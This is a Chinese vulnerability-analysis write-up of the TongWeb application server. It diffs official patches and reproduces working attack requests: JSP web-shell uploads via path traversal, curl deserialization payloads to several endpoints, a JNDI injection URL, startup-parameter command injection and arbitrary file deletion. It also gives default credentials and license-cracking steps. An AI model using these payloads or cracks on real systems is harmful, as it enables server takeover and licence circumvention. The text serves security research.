# TongWeb

## 环境搭建
Tongweb安装，双击`Install_TW6.1.5.13_Enterprise_JDK_Windows.exe`。一直点击下一步即可。安装完成后，从bin目录下的`startserver.bat`文件启动tongweb。如果控制台出现`TongWeb server startup complete`即启动成功

访问`http://ip:9060/console`，如果成功看到TongWeb管理控制台界面即成功。tongweb6.1登陆`用户名:thanos 密码:thanos123.com`

**license破解**

twnt.jar是license相关包，破解的twnt.jar放到lib目录下替换，并在tongweb根目录下创建一个空的license.dat。有的破解twnt.jar可能已经失效，例如启动tongweb时报错license过期。针对license过期的问题，修改`com.tongtech.a.b.a.a.a`类中`end_date`字段值，例如修改为2025-10-10

**修改jar包的技巧**

假如想要替换jar包中某个类的内容。新建一个IDEA工程，选取TongWeb对应的JDK版本，例如1.7，在src目录下，根据想要替换的类的package路径创建一个类，然后复制源类中的内容并进行修改，然后点击IDEA的build，生成out文件夹下对应的.class文件，复制出来。用7zip打开jar包，用生成的.class替换掉原文件即可。

**相关用户名和密码**
```
# console
thanos thanos123.com

# sysweb
cli cli123.com
```

## 路由解析

核心路由都在`/console/WEB-INF/web.xml`中

Filter配置了：CharacterEncodingFilter、ConsoleFilter、LoginFilter、AuthorityFilter、AccessChecker、LogFilter。只有LoginFilter控制`/rest/*`，其他所有Filter管理的都是全路径`/*`

Servlet配置，重点在于名为springmvc的servlet
```
    <servlet>
        <servlet-name>springmvc</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>
                classpath*:console-tongweb-spring.xml,
                classpath*:service-remotecall.xml
            </param-value>
        </init-param>
        <load-on-startup>5</load-on-startup>
    </servlet>
```
该servlet包含的路径如下
```
/dwr/*
/rest/*
/jqueryFileTre
/notinrealm/rest/*
/deploy/*
/service/*
```

**安全认证配置**

`<security-constraint>`会限制对某个资源的访问，`web-resource-collection`标识限制访问的资源子集。`<auth-constraint>`元素用于指定可以访问该资源集合的用户角色。如果没有指定auth-constraint元素，会约束所有角色。`<role-name>`元素包含安全角色的名称

`<login-config>`用来指定所使用的验证方法、领域名和表单验证机制所需的特性。验证方法`<auth-method>`包括`BASIC、DIGEST、FORM、CLIENT-CERT`。如果是FORM就是采用表单验证。

其中值得注意的是`none-realm-resources`下的路由，这些不受权限认证的限制。除了静态资源的访问路径，`/notinrealm/rest/*`、`/service`是上面springmvc对应的路径
```xml
    <security-constraint>
        <web-resource-collection>
            <web-resource-name>none-realm-resources</web-resource-name>
            <url-pattern>/notinrealm/rest/*</url-pattern>
            <url-pattern>/service</url-pattern>
            <url-pattern>/403error.jsp</url-pattern>
            <url-pattern>/408error.jsp</url-pattern>
            <url-pattern>/css/*</url-pattern>
            <url-pattern>/images/*</url-pattern>
            <url-pattern>/res/*</url-pattern>
            <url-pattern>/script/*</url-pattern>
            <url-pattern>/pages/monitor/*</url-pattern>
        </web-resource-collection>
    </security-constraint>
    <security-constraint>
        <display-name>TongWeb Security Constraint</display-name>
        <web-resource-collection>
            <web-resource-name>Protected Area</web-resource-name>
            <url-pattern>/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>tongweb</role-name>
            <role-name>security</role-name>
            <role-name>auditor</role-name>
        </auth-constraint>
    </security-constraint>

    <login-config>
        <auth-method>FORM</auth-method>
        <realm-name>twnt-realm</realm-name>
        <form-login-config>
            <form-login-page>/login.jsp</form-login-page>
            <form-error-page>/loginerror.jsp</form-error-page>
        </form-login-config>
    </login-config>
```


## 补丁分析
补丁地址： http://www.tongtech.com/Services/Services-103_2.html

根据补丁的发布顺序，官方修复的信息大致如下

 - [补丁1.关闭命令行运维用户的上传文件功能](#补丁1)

 - [补丁2.修复控制台命令执行文件上传存储型XSS未授权访问问题](#补丁2)

 - [补丁3.修复管理控制台文件上传和下载问题](#补丁3)

 - [补丁4.修复未授权JNDI注入和控制台命令执行问题](#补丁4)

 - [补丁5.修复命令执行、未授权访问、文件上传/下载/删除等问题](#补丁5)


| 补丁编号-漏洞类型 | 对应类 | 访问地址 |
| :---: | :---: | :---: |
|补丁1-文件上传|com.tongweb.admin.jmx.remote.server.servlet.AppUploadServlet|`/sysweb/upload`|
|补丁2-文件上传|com.tongweb.console.deployer.controller.Upload|`/console/Upload`|
|补丁2-命令执行|com.tongweb.admin.jmx.remote.server.servlet.RemoteJmxConnectorServlet|`/sysweb/rjcs`|
|补丁3-文件上传/下载|com.tongweb.agent.com.FileTransferUtil#sendFile/receiveFile|——|
|补丁4-JNDI|com.tongweb.console.jca.controller.JCAController|`/console/rest/jca/nameCheck`|
|补丁4-命令执行|com.tongweb.server.ExternalOptions|服务器参数中加入`-version&&calc`|
|补丁5-Log任意下载|com.tongweb.console.log.controller.LogShowController|`/console/rest/log/downloadLog`|
|补丁5-管理控制台未授权访问|com.tongweb.console.security.controller.UserController#create/update|`/console/rest/security/users/create`|
|补丁5-命令执行|org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter|`/console/service`|
|补丁5-任意文件删除|com.tongweb.console.monitor.controller.SnapshotController|`/console/rest/monitor/snapshots/delete`|
|补丁5-EJB远程调用反序列化|com.tongweb.tongejb.server.httpd.ServerServlet|`/console/ejb/`|



### 补丁1
官方链接地址： http://www.tongtech.com/api/sys/stl/actions/download?siteId=1&channelId=103&contentId=1702&fileUrl=xnKfUxgX5AnAHragMhPos7yDZQjUkAtxtA0add0c68F6GB8DD0slash0X0QzzvpY7iSRHYmQD2rQzbbXXwFXxueaoSL4wV0ihfQjYmNih10secret0

补丁修复位于`\applications\sysweb\WEB-INF\web.xml`，直接将补丁替换原文件即可，对比补丁和原文件，发现删除了如下几行
```
	<servlet>
		<servlet-name>upload</servlet-name>
		<servlet-class>com.tongweb.admin.jmx.remote.server.servlet.AppUploadServlet</servlet-class>
	</servlet>
	<servlet-mapping>
		<servlet-name>upload</servlet-name>
		<url-pattern>/upload</url-pattern>
	</servlet-mapping>
```

这个访问路径为`http://ip:9060/sysweb/upload`，默认的用户名`cli`，密码`cli123.com`

<details>
  <summary>AppUploadServlet代码</summary>
  <pre>
  <code>
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        PrintWriter out = resp.getWriter();
        InputStream is = null;
        FileOutputStream fos = null;
        String tempPath = System.getProperty("tongweb.home") + File.separator + "temp";
        String filePath = tempPath + File.separator + "upload";
        try {
            Iterator i$ = req.getParts().iterator();
            while(i$.hasNext()) {
                Part p = (Part)i$.next();
                is = p.getInputStream();
                String header = p.getHeader("content-disposition");
                String fileName = this.parseFileName(header); // return header.substring(header.lastIndexOf("=") + 1, header.length());
                File file = new File(filePath, fileName);
                if (!file.exists()) {
                    File temp = new File(filePath);
                    if (!temp.exists()) {
                        temp.mkdir();
                    }
                    file.createNewFile();
                }
                fos = new FileOutputStream(file);
                byte[] buffer = new byte[1856219];
                while(true) {
                    int bytedata = is.read(buffer);
                    if (bytedata == -1) {
                        break;
                    }
                    fos.write(buffer, 0, bytedata);
                }
            }
            out.write("success!");
        } catch (IOException var18) {
            out.write("fail to upload\n");
            var18.printStackTrace();
        } finally {
            if (is != null) {
                is.close();
            }
            if (out != null) {
                out.flush();
                out.close();
            }
            if (fos != null) {
                fos.flush();
                fos.close();
            }
        }
    }
  </code>
  </pre>
</details>

下面发包过程存在一个坑，主要是AppUploadServlet代码中在获取fileName时用了parseFileName方法，该方法截取最后一个等号后的内容，然后和Tongweb的安装目录`C:\TongWeb6.1\temp\upload`进行拼接。

如果直接上传文件，一般filename="c.jsp"，这样拼接完的路径是`C:\TongWeb6.1\temp\upload\"c.jsp"`，而Windows又禁止文件名包含`\ / : * ? " < > |`其中的一个。所以在抓包时，将filename后面的引号去掉，并且可以跨目录
```
POST /sysweb/upload HTTP/1.1
Authorization: Basic Y2xpOmNsaTEyMy5jb20=
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaYguOre6zCdYZhE1

------WebKitFormBoundaryaYguOre6zCdYZhE1
Content-Disposition: form-data; name="filename"; filename=../../applications/console/c.jsp
Content-Type: application/octet-stream

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
------WebKitFormBoundaryaYguOre6zCdYZhE1--
```

这个数据包还有个值得注意的点`Authorization: Basic Y2xpOmNsaTEyMy5jb20=`，Basic后的字段解码为`cli:cli123.com`。也就是sysweb模块是用base64用户名:密码做身份认证的，



### 补丁2
官方链接地址： http://www.tongtech.com/api/sys/stl/actions/download?siteId=1&channelId=103&contentId=1753&fileUrl=xnKfUxgX5AnAHragMhPos0zLlCKtEWcgEVu7Fq30slash0iAAmnb7FAyWCRGS55tXbRe8kfllSdIO7tgDJkKQOkXMk1E89ECP85P41sfdPBEr1QqSM8Y0JwNSKEw0equals00equals00secret0

这四个补丁都是针对于控制台的，这里看一下文件上传和命令执行的漏洞

**（1）文件上传**

补丁打在了`com.tongweb.console.deployer.controller.Upload类`，这个的访问地址`/console/Upload`
```java
public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String method = request.getParameter("method"); // 想要调用upload方法，需要method参数为upload
    if (method.equals("upload")) {
        this.upload(request, response);
    }
}
```
upload方法利用组件commons-fileupload-1.3.3.jar进行文件上传操作，具体代码点击展开
<details>
  <summary>Upload代码</summary>
  <pre>
  <code>
    public void upload(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        response.setContentType("text/html");
        response.setCharacterEncoding("UTF-8");
        long MAX_SIZE = 1073741824L;
        String tempPath = System.getProperty("tongweb.home") + File.separator + "temp";
        String filePath = tempPath + File.separator + "upload";
        File uploadApplicationDir = new File(filePath);
        if (!uploadApplicationDir.exists()) {
            uploadApplicationDir.mkdir();
        }
        String jsonp = request.getParameter("callback");
        DiskFileItemFactory dfif = new DiskFileItemFactory();
        dfif.setSizeThreshold(5120);
        dfif.setRepository(new File(tempPath));
        ServletFileUpload sfu = new ServletFileUpload(dfif);
        sfu.setSizeMax(1073741824L);
        PrintWriter out = response.getWriter();
        final HttpSession session = request.getSession();
        sfu.setProgressListener(new ProgressListener() {
            private long temp = -1L;
            public void update(long readBytes, long totalBytes, int item) {
                if (this.temp != readBytes) {
                    this.temp = readBytes;
                    if (readBytes != -1L) {
                        session.setAttribute("readBytes", "" + readBytes);
                        session.setAttribute("totalBytes", "" + totalBytes);
                    }
                }
            }
        });
        List fileList = null;
        try {
            fileList = sfu.parseRequest(request);
        } catch (FileUploadException var23) {...}
        Iterator fileItr = fileList.iterator();
        while(fileItr.hasNext()) {
            FileItem fileItem = null;
            String path = null;
            fileItem = (FileItem)fileItr.next();
            if (fileItem != null && !fileItem.isFormField()) {
                path = fileItem.getName();
                path.substring(path.lastIndexOf("/") + 1);
                String t_name = path.substring(path.lastIndexOf("\\") + 1);
                String u_name = filePath + File.separator + t_name;
                try {
                    synchronized(u_name) {
                        fileItem.write(new File(u_name));
                    }
                } catch (Exception var22) {
                    var22.printStackTrace();
                }
            }
        }
    }
  </code>
  </pre>
</details>

发送文件上传数据包，这里就不用关注filename是否包含引号的问题了，但是数据包可以看出console用的cookie做身份认证。
```
POST /console/Upload?method=upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBZshdxEqKekYAuiB
Cookie: console-58ef4bbb-6bb7=1D37708C8D90C4EB41147ED6DB076BEF

------WebKitFormBoundaryBZshdxEqKekYAuiB
Content-Disposition: form-data; name="filename"; filename="../../applications/console/k.jsp"
Content-Type: application/octet-stream

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
------WebKitFormBoundaryBZshdxEqKekYAuiB--
```

补丁修复，在upload方法的文件内容写入部分之前，加入`UploadFileValidation.checkUploadDeployFile(filePath, path);`检查。代码如下。主要做了两件事（1）判断路径是否存在目录穿越的`..` (2) 判断文件后缀是否为`.war、.ear、.rar、.jar`
<details>
  <summary>checkUploadDeployFile代码</summary>
  <pre>
  <code>
    public static ResultInfo checkUploadDeployFile(String filePath, String fileName) {
        ResultInfo result = new ResultInfo();
        result.setSuccess(true);
        try {
            File file = new File(filePath, fileName);
            File parentfile = new File(filePath);
            String oldParentPath = parentfile.getCanonicalPath();
            String newParentPath = file.getParentFile().getCanonicalPath();
            if (!oldParentPath.equals(newParentPath)) {
                result.setErrorInfo("Illegal upload path!");
                result.setSuccess(false);
                return result;
            }
            String realname = file.getName();
            String validate = realname.substring(realname.lastIndexOf("."));
            if (!validate.equals(".war") && !validate.equals(".ear") && !validate.equals(".rar") && !validate.equals(".jar") && !validate.equals(".car")) {
                result.setErrorInfo("Illegal document! fail to upload!");
                result.setSuccess(false);
                return result;
            }
        } catch (Exception var9) {
            var9.printStackTrace();
        }
        return result;
    }
  </code>
  </pre>
</details>

**（2）命令执行**

补丁位置位于`com.tongweb.admin.jmx.remote.server.servlet.RemoteJmxConnectorServlet`，其readRequestMessage方法增加了数据流内容校验，如果数据流中包含`java/lang/Runtime`或者`new ServerSocket`就抛出异常。其原本代码如下，明显的反序列化漏洞
```java
    private Message readRequestMessage(HttpServletRequest request) throws IOException, ClassNotFoundException {
        JMXInbandStream.setOutputStream((InputStream)null, 0L);
        InputStream in = request.getInputStream();
        ObjectInputStream ois = new ObjectInputStream(in);
        MBeanServerRequestMessage m = (MBeanServerRequestMessage)ois.readObject();
        StreamMBeanServerRequestMessage streamm = (StreamMBeanServerRequestMessage)m;
        if (streamm.isStreamAvailable()) {
            JMXInbandStream.setIncomingStream(new JMXChunkedInputStream(in));
        }

        logger.fine("Method id is: " + m.getMethodId());
        return m;
    }
```
请求入口是doPost。由于RemoteJmxConnectorServlet位于sysweb中，查看sysweb模块下的web.xml内容，发现此类的访问路径是`/rjcs`
```java
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    this.processRequest(request, response);
}

protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    try {
        String pathInfo = request.getPathInfo();
        if (pathInfo != null && pathInfo.trim().equals("/NotificationManager")) {
            this.requestHandler.getNotificationManager().getNotifications(request, response);
        } else {
            Message requestMessage = this.readRequestMessage(request);
            ...
	}
```
这样发包的payload如下（上文提到sysweb模块存在Authorization的验证）
```
curl -X POST "http://172.16.165.146:9060/sysweb/rjcs"  --data-binary @test2.txt -H "Authorization: Basic Y2xpOmNsaTEyMy5jb20="
```
需要注意的是，TongWeb中存在commons-beanutils.jar，但是和原生的commons-beanutils.jar不同，原生利用类`org.apache.commons.beanutils.BeanComparator`路径都变为了`com.tongweb.commons.beanutils.BeanComparator`，所以ysoserial无法直接使用，需要改一下CB1的生成过程。

### 补丁3

官方补丁链接：http://www.tongtech.com/api/sys/stl/actions/download?siteId=1&channelId=103&contentId=1869&fileUrl=xnKfUxgX5AnAHragMhPos0QDqEthxvBOO0slash0kp7T3K6T0slash0pfE0add09ly0slash0OV9ullB0slash0esT9Y0secret0

补丁位置：`com.tongweb.agent.com.FileTransferUtil#sendFile/receiveFile`，根据方法名也可以推测，sendFile文件上传漏洞，receiveFile文件下载漏洞

查找receiveFile相关调用
```
com.tongweb.console.log.controller.LogShowController#downloadLog
com.tongweb.console.monitor.controller.SnapshotController#downloadSnaToMas
```
sendFile无法查询到，但是它上层是被AgentUtil.copyFile调用的，查找copyFile被调用的地方
```
com.tongweb.console.monitor.controller.SnapshotController#uploadResult
```


### 补丁4

官方补丁链接： http://www.tongtech.com/api/sys/stl/actions/download?siteId=1&channelId=103&contentId=2007&fileUrl=xnKfUxgX5AnAHragMhPosxbwroaBqZ5eGSjfToIg6dGpEVC0add0oJQMer0MdhKJ4E0add06g79kKXYFVPZoI7FTUBd1fA0equals00equals00secret0

**（1）JNDI注入**

```
http://ip:9060/console/rest/jca/nameCheck?name=rmi://ip:1099/jzr8wb
```
漏洞点位于`com.tongweb.console.jca.controller.JCAController#checkJNDIName`
```java
    @GET
    @Path("nameCheck")
    @Produces({"application/xml", "application/json"})
    public void checkJNDIName(@QueryParam("name") String name) {
        PrintWriter writer = null;
        try {
            writer = this.response.getWriter();
            writer.print(this.jcaService.checkJNDIName(name)); // checkJNDIName调用了lookup
            writer.close();
        } ...
    }
    
    public boolean checkJNDIName(String name) throws Exception {
        Object old = (new InitialContext()).lookup(name.trim());
    }
```

**（2）命令执行**

启动参数存在可执行命令，ExternalOptions，修复主要是加入```if (!twOpt.contains("`") && !twOpt.contains("%60")) ```，`twOpt`对应服务器参数。

在console的启动参数配置——服务器参数中加入`-version&&calc`，利用命令注入的方式进行攻击，一旦服务器重启，可造成命令执行。

### 补丁5

官方补丁地址： http://www.tongtech.com/api/sys/stl/actions/download?siteId=1&channelId=103&contentId=2008&fileUrl=xnKfUxgX5AnAHragMhPosxbwroaBqZ5eGSjfToIg6dGpEVC0add0oJQMer0MdhKJ4E0add06Qj1jO1h4aVKhEUw0slash0ARJwfbvZ0NUR0aCH0secret0

**(1) Log任意下载漏洞**

先查询有那些日志，然后填入names参数下载对应日志
```
GET http://ip:9060/console/rest/log/allFiles
POST http://ip:9060/console/rest/log/downloadLog?names=server.log
```

对应的类
```java
# LogShowController

@POST
@Path("downloadLog")
public JSONObject downloadLog() {
    try {
        String[] logFileNames = this.getArrayParameterMap("names");
        this.finder.downloadLog(logFileNames, this.response);
    } ...
}


# LogFinder

public void downloadLog(String[] logFileNames, HttpServletResponse response) throws Exception {
        this.refreshRotatedFiles();
        List<File> files = new ArrayList();
        String[] arr$ = logFileNames;
        int len$ = logFileNames.length;

        for(int i$ = 0; i$ < len$; ++i$) {
            String fileName = arr$[i$];
            File file = new File(this.logFile.getParent(), fileName);
            if (file.getCanonicalFile().getParent().equals(this.logFile.getParent())) {
                files.add(file);
            }
        }

        downloadFiles(files, response);
    }
```

<details>
  <summary>downloadFiles代码</summary>
  <pre>
  <code>
  public static void downloadFiles(List<File> files, HttpServletResponse response) throws Exception {
        ZipOutputStream os = null;
        try {
            response.addHeader("Content-disposition", "attachment; filename=log.zip");
            response.setContentType("application/octet-stream");
            os = new ZipOutputStream(new BufferedOutputStream(response.getOutputStream()));
            byte[] buff = new byte[1024];
            Iterator i$ = files.iterator();
            while(i$.hasNext()) {
                File file = (File)i$.next();
                BufferedInputStream fis = null;
                try {
                    fis = new BufferedInputStream(new FileInputStream(file));
                    os.putNextEntry(new ZipEntry(file.getName()));
                    int len;
                    while((len = fis.read(buff)) > 0) {
                        os.write(buff, 0, len);
                    }
                    os.closeEntry();
                } finally {
                    fis.close();
                }
            }
        } finally {
            if (os != null) {
                os.close();
            }
        }
    }
  </code>
  </pre>
</details>

**（2）管理控制台未授权访问漏洞**

TongWeb6控制台创建用户、修改用户和设置权限_补丁004

补丁在`com.tongweb.console.security.controller.UserController#create/update`的方法中都加入了如下的权限判断
	
```java
HttpSession session = this.request.getSession();
GenericPrincipal genericPrincipal = (GenericPrincipal)((StandardSession)((StandardSessionFacade)session).session).getPrincipal();
if (genericPrincipal == null) {
    resultInfo.setSuccess(false);
    resultInfo.setMessage("No permission");
    return resultInfo;
} else {
    String[] loginRoles = genericPrincipal.getRoles();
    UserBean u = null;

    try {
	u = this.userService.getUserByName(realmName, name);
    } catch (Exception var23) {
	resultInfo = ResultInfoUtil.getResultInfo(var23, name);
    }

    if (u.getRoles() == null || u.getName() == null) {
	roles = "";
	if (!"tongweb".equals(loginRoles[0])) {
	    resultInfo.setSuccess(false);
	    resultInfo.setMessage("No permission");
	    return resultInfo;
	}
    }
```

**（3）命令执行漏洞**
位于补丁_006，`com/tongweb/server/ExternalOptions`，类似补丁4中的命令执行

**（4）console存在命令行执行漏洞**

位于补丁_005。`com/tongweb/heimdall/common/remotecall/HttpInvokerServiceExporter.class`，这个类在查找路由的时候，可以和前面路由部分的内容对照。`/service`是springmvc在加载`service-remotecall.xml`时配置的。`/service`由SimpleUrlHandlerMapping进行分发，对应的处理类id为remoteCall，实际类为`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`，也就是打补丁的这个类
	
```xml
<bean
	id="remoteCall"
	class="org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter">
	<property
		name="service">
		<bean
			class="com.tongweb.common.remotecall.server.HttpInvokerRemoteCall" />
	</property>
	<property
		name="serviceInterface"
		value="com.tongweb.common.remotecall.RemoteCall" />
</bean>
<bean
	class="org.springframework.web.servlet.handler.SimpleUrlHandlerMapping">
	<property
		name="urlMap">
		<map>
			<entry
				key="/service"
				value-ref="remoteCall" />
		</map>
	</property>
</bean>
```
HttpInvokerServiceExporter处理请求的方法如下
```java
    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            RemoteInvocation invocation = this.readRemoteInvocation(request);
            RemoteInvocationResult result = this.invokeAndCreateResult(invocation, this.getProxy());
            this.writeRemoteInvocationResult(request, response, result);
        } catch (ClassNotFoundException var5) {
            throw new NestedServletException("Class not found during deserialization", var5);
        }
    }
```
readRemoteInvocation核心代码如下，进行了反序列化操作
```java
ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));
RemoteInvocation var4 = this.doReadRemoteInvocation(ois); // doReadRemoteInvocation核心代码-> Object obj = ois.readObject();
```
那么这个漏洞的攻击就是对`/console/service`接口发送恶意反序列化数据包（注意，如果没有加如下的头部，代码执行过程中会抛出异常而报错）
```
curl -X POST "http://ip:9060/console/service" --data-binary @test2.txt -H "Content-type: application/octet-stream"
```

**（5）任意文件删除漏洞**
位于补丁_007，`applications/console/WEB-INF/classes/com/tongweb/console/commons/ConsoleFilter.class`,原本`ConsoleFilter.doFilter()`只是一行简单的链式调用
```
chain.doFilter(request, response);
```
打过补丁之后，`ConsoleFilter.doFilter()`如下，`/monitor/snapshots/delete`是明显的与删除有关的路由
```java
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
    boolean illegal = false;
    HttpServletRequest req = (HttpServletRequest)request;
    HttpSession session = req.getSession();

    try {
        String url = req.getRequestURI();
        if (url.contains("/monitor/snapshots/delete")) {
	    Enumeration pNames = request.getParameterNames();

	    while(true) {
	        List beannames;
	        do {
		    String name;
		    do {
    		        if (!pNames.hasMoreElements()) {
			    return;
		        }

		        name = (String)pNames.nextElement();
		    } while(!name.equals("snapshotnames"));

		    String nameString = request.getParameter(name);
		    String[] beans = nameString.split(",");
		    beannames = Arrays.asList(beans);
	        } while(beannames.size() == 1 && "".equals(beannames.get(0)));

	        Iterator i$ = beannames.iterator();

	        while(i$.hasNext()) {
		    String beanname = (String)i$.next();
		    if (!beanname.equals("")) {
		        if (beanname.contains("../")) {
			    illegal = true;
		        }

		        try {
			    fileFormatter.parse(beanname);}
		        ...
}
```
搜索`/monitor/snapshots/delete`所在位置，位于`com.tongweb.console.monitor.controller.SnapshotController`类的deleteSnapshot方法
```java
@Controller
@Path("/rest/monitor/snapshots")
public class SnapshotController extends BaseController {
    @POST
    @Path("delete")
    @Produces({"application/json"})
    public ResultInfo deleteSnapshot() {
        ResultInfo result = null;
        String nameString = this.getStringParameterMap("snapshotnames");
        String[] beannames = nameString.split(",");
        result = this.service.deleteSnapshotBeans(Arrays.asList(beannames));
        return result;
    }
}
```
snapshots的根目录是`C:\TongWeb6.1\snapshot`，根据想要删除的文件，可以跨目录拼接

发送数据包的payload如下
```
POST /console/rest/monitor/snapshots/delete?snapshotnames=../applications/console/aa.jsp
```

**（6）访问日志-任意文件写入&路径穿越漏洞**
	
定位补丁_003，com.tongweb.console.log.controller.LogShowController
```
POST /console/rest/log/setServerLogConfig?serverlogDir=applications/console/&rotationFileCount=1
```

定位补丁_001。`com.tongweb.console.webcontainer.controller.AccessLogController#update`

```
POST /console/rest/webconfig/accesslog/put
```

**（7）spring、CommonsCollections、XStream漏洞**

xmlpull、CommonsCollections、XStream组件升级_补丁008、补丁009

**（8）EJB远程调用反序列化漏洞**

位于补丁_002
```
com.tongweb.tongejb.server.httpd.ServerServlet
com/tongweb/tongejb/core/ivm/EjbObjectInputStream.class_补丁002
com/tongweb/tongejb/client/EjbObjectInputStream.class
```
需要注意的是，这个类本身在web.xml中默认是被注释掉的，也就是无法访问的。需要手动开启。
```xml
    <servlet>
        <servlet-name>ServerServlet</servlet-name>
        <servlet-class>com.tongweb.tongejb.server.httpd.ServerServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>ServerServlet</servlet-name>
        <url-pattern>/ejb/*</url-pattern>
    </servlet-mapping>
```
并且在console目录下，需要登陆权限，所以发包时需要加入cookie，这个反序列化的数据包和之前生成的新CB1有一些不同，主要看一下调用代码中存在的一个问题
```	
curl -X POST "http://ip:9060/console/ejb/" --data-binary @test2.txt -H "Content-type: application/octet-stream" -H "Cookie: xxx" 
```
ServerServlet是请求的入口，其service方法调用了`EjbServer.service()`，继续跟进调用的是`EjbDaemon.service()`，代码如下
```java
public void service(InputStream in, OutputStream out) throws IOException {
    ProtocolMetaData protocolMetaData = new ProtocolMetaData();
    ObjectInputStream ois = null;
    ObjectOutputStream oos = null;
    RequestType requestType = null;
    byte requestTypeByte = RequestType.NOP_REQUEST.getCode();

    try {
        String msg;
        try {
            protocolMetaData.readExternal(in); // (1)
            PROTOCOL_VERSION.writeExternal(out);
            ois = new EjbObjectInputStream(in);
            oos = new ObjectOutputStream(out);
            ServerMetaData serverMetaData = new ServerMetaData();
            serverMetaData.readExternal(ois); // (2) 这个ois是ObjectInputStream类型的，符合反序列化
            ClientObjectFactory.serverMetaData.set(serverMetaData);
            requestTypeByte = (byte)ois.read();
            requestType = RequestType.valueOf(requestTypeByte);
	}...
}   
```
当发送之前漏洞用的改造后的CB1链条数据包，会在代码(1)处报错`Unable to read protocol version`，跟进ProtocolMetaData.readExternal()
```java
public void readExternal(InputStream in) throws IOException {
    byte[] spec = new byte[8];

    for(int i = 0; i < spec.length; ++i) {
        spec[i] = (byte)in.read();
        if (spec[i] == -1) {
            throw new EOFException("Unable to read protocol version.  Reached the end of the stream.");
        }
    }

    this.init(new String(spec, "UTF-8"));
}
```
这部分先读了八位字符，作为protocol version，查看跟进ProtocolMetaData类的init方法，发现有如下定义，也就是protocol version的八位形如`OEJP/1.1`
```
assert spec.matches("^OEJP/[0-9]\\.[0-9]$") : "Protocol version spec must follow format [ \"OEJB\" \"/\" 1*DIGIT \".\" 1*DIGIT ]";
```
还有个知识点，`in.read()`读取数据时，是不回退的，也就是读完八位，下一次再read时，会直接从八位后面获取数据。另外，还需要注意，readExternal只是单纯读取数据流，而没有做反序列化处理，所以这个protocol version的八位不应该写入序列化数据流中，直接放入请求中即可。
				   
但是在CB1数据流前加入`OEJP/1.1`，走到反序列化时还是不成功的，问题在于代码(2)处，这个in类型虽然是ObjectInputStream类型的，但在readObject()处理之前，先用`in.readByte()`读取了一位字符，这样构造的反序列化都会被打乱。所以需要在序列化时填入一位字符
```java
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
        byte version = in.readByte();
        this.locations = (URI[])((URI[])in.readObject());
        this.location = this.locations[0];
    }
```
这样在生成CB1时的代码如下
```
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeByte(1); //先写入一位字符
oos.writeObject(queue);
```

				   





